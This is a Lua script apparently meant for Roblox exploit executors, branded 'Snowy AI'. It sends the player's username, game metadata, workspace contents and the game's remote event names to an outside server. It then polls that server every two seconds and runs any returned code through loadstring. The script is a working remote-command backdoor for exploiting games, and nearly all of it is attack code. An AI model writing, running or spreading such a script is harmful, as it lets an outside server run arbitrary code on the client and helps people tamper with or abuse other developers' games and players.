-- Snowy AI Roblox Script (Version Exploit / Executor - LIVE TELEMETRY)
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")

local requestFunc = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request

local player = Players.LocalPlayer
local username = player.Name
local apiUrl = "https://snowy-ai.onrender.com"

print("Snowy AI: Initialisation pour " .. username)

-- Collect real game data
local gameInfo = {
    Name = "Unknown",
    Creator = "Unknown",
    Created = "Unknown",
    Updated = "Unknown",
    Description = "Unknown"
}

pcall(function()
    local info = MarketplaceService:GetProductInfo(game.PlaceId)
    if info then
        gameInfo.Name = info.Name
        gameInfo.Creator = info.Builder
        gameInfo.Created = info.Created
        gameInfo.Updated = info.Updated
        gameInfo.Description = info.Description
    end
end)

-- Scan workspace briefly
local function getBasicHierarchy()
    local workspaceChildren = {}
    for i, v in ipairs(game.Workspace:GetChildren()) do
        if i <= 15 then -- Limit to 15 to avoid massive payload
            table.insert(workspaceChildren, v.Name .. " (" .. v.ClassName .. ")")
        end
    end
    
    local remotes = {}
    for _, v in ipairs(game.ReplicatedStorage:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
            table.insert(remotes, v.Name)
            if #remotes > 15 then break end
        end
    end
    
    return {
        Workspace = workspaceChildren,
        Remotes = remotes
    }
end

local function connect()
    local hierarchy = getBasicHierarchy()
    
    local payload = {
        username = username,
        placeId = game.PlaceId,
        gameName = gameInfo.Name,
        gameCreator = gameInfo.Creator,
        gameCreated = gameInfo.Created,
        gameUpdated = gameInfo.Updated,
        gameDescription = gameInfo.Description,
        workspacePreview = hierarchy.Workspace,
        remotePreview = hierarchy.Remotes
    }
    
    local success = false
    if requestFunc then
        local res = requestFunc({
            Url = apiUrl .. "/api/roblox/connect",
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(payload)
        })
        success = res.Success
    else
        local s, r = pcall(function()
            return HttpService:PostAsync(
                apiUrl .. "/api/roblox/connect",
                HttpService:JSONEncode(payload),
                Enum.HttpContentType.ApplicationJson
            )
        end)
        success = s
    end
    
    if success then
        print("Snowy AI: Connecté au site avec succès ! Télémetrie envoyée.")
    else
        warn("Snowy AI: Échec de connexion au site. Nouvelle tentative dans 5s...")
        task.wait(5)
        connect()
    end
end

local function pollCommands()
    while true do
        local success, body = false, nil
        
        if requestFunc then
            local res = requestFunc({
                Url = apiUrl .. "/api/roblox/poll/" .. username,
                Method = "GET"
            })
            success = res.Success
            body = res.Body
        else
            local s, r = pcall(function()
                return HttpService:GetAsync(apiUrl .. "/api/roblox/poll/" .. username)
            end)
            success = s
            body = r
        end
        
        if success and body then
            local data = HttpService:JSONDecode(body)
            if data and data.command then
                print("Snowy AI: ANALYSED Request...")
                local func, err = loadstring(data.command)
                if func then
                    pcall(func)
                    print("Snowy AI: EXECUTED")
                else
                    warn("Snowy AI: Compilation Error - " .. tostring(err))
                end
            end
        end
        task.wait(2)
    end
end

task.spawn(connect)
task.spawn(pollCommands)
print("Snowy AI: Prêt et en attente !")
